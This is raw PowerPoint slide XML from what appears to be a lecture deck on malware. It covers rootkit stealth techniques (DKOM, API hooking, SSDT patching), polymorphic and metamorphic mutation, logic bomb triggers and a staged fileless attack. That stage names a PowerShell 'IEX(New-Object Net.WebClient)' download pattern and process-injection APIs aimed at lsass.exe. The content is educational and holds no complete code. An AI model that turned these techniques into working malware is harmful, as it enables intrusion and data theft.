                </a:solidFill>
              </a:rPr>
              <a:t>Hypervisor Rootkit:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Relocates the host OS into a virtual machine, gaining hardware-level visibility over all system activity.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="23844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Stealth Techniques</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="19344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DKOM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Unlinking process entries from the kernel's process list (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>EPROCESS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> doubly-linked list) renders the process invisible to Task Manager and process enumeration APIs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>API Hooking:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Intercepts Windows Native API calls to filter out rootkit-owned files, processes, and registry keys from query responses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SSDT Patching:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Overwrites the System Service Descriptor Table function pointers to redirect kernel calls through attacker-controlled code.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Rootkits &amp; Kernel-Level Persistence (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_rootkit_layers.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1342503" y="1330000"/>
            <a:ext cx="843146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Rootkit infection layers, the deeper the rootkit embeds, the harder it is to detect and the more of the system it can conceal from security tools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Polymorphic vs. Metamorphic Malware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Polymorphic</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> malware mutates its binary signature with each replication using encryption and variable decryption stubs. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Metamorphic</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> malware goes further, it rewrites its own functional code body, producing specimens with no shared byte sequences, defeating even heuristic signature matching.</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Property</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Polymorphic</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Metamorphic</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Code Body</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Unchanged, encrypted under variable key</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Fully rewritten using semantic-equivalent substitutions</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mutation Engine</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Generates a new encryption key and decryption stub per copy</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Applies instruction substitution, register reassignment, dead code insertion</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Detection Risk</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Decryption stub patterns can be detected heuristically</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>No stable patterns, emulation or sandbox execution required</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Complexity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Moderate, widely available in exploit kits</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Very high, requires a sophisticated rewriting engine</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302371">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Examples</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Storm Worm, Virut, Sality</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>W32/Simile (Etap), W32/Zperm</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">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Polymorphic vs. Metamorphic Malware (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_polymorphic_metamorphic_comparison.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Polymorphic vs. metamorphic mutation, polymorphic variants share a constant payload core; metamorphic variants share no bytes at all across copies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Logic Bombs &amp; Time-Triggered Payloads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logic bomb</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a malicious code segment inserted into an otherwise legitimate program that executes its payload only when a specific condition is met, such as a calendar date, a system event, or the absence of a specific file or user account.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="258962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Trigger Condition Types</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="213962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Date/Time Triggers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Payload fires on a specific calendar date (e.g., "Michelangelo" activated on March 6).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Event Triggers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Activate on system events such as user login, file access, or network connection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Negative Triggers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Payload fires when an expected condition is absent, e.g., if the insider's employee account no longer exists (a "deadman switch" for terminated employees).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Counter Triggers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Activates after a specific number of system boots or application launches.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="258962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Insider Threat Context</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="213962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Logic bombs are frequently planted by </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>malicious insiders</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, employees, contractors, or system administrators with privileged access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CERT Insider Threat Center studies show logic bombs are a top technique used by IT administrators in sabotage incidents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Time-to-discovery is high because the bomb is dormant and indistinguishable from legitimate code during routine audits.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Logic Bombs &amp; Time-Triggered Payloads (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_logic_bomb_timeline.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3291951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="46619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Logic bomb lifecycle, the extended dormancy between insertion and detonation makes detection exceptionally difficult without dedicated code review practices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Fileless Malware &amp; Memory-Resident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Fileless malware</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> achieves execution entirely within the operating system's legitimate processes and volatile memory, leaving no malware executable written to the file system, defeating file-scanning antivirus and many EDR controls that rely on disk-resident artifacts for detection.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="10555354" cy="20581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Initial Delivery:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A malicious document or URL delivers a small script (PowerShell, VBScript, JavaScript) via email attachment or drive-by download.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Script Execution:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The script runs inside a trusted interpreter (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>powershell.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>wscript.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) and downloads the second-stage payload directly into memory using </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>IEX(New-Object Net.WebClient)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> patterns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Process Injection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The memory-resident payload uses Windows API calls (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>VirtualAllocEx</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>WriteProcessMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>CreateRemoteThread</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) to inject itself into a legitimate high-trust process like </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>explorer.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>lsass.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Persistence via Living-off-the-Land (LotL):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Uses legitimate OS tools (scheduled tasks via </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>schtasks.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, registry run keys, WMI subscriptions) to maintain persistence without writing any custom binary to disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>C2 &amp; Exfiltration:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Issues commands and exfiltrates data entirely through HTTPS connections made by the legitimate host process.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Fileless Malware &amp; Memory-Resident Attacks (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
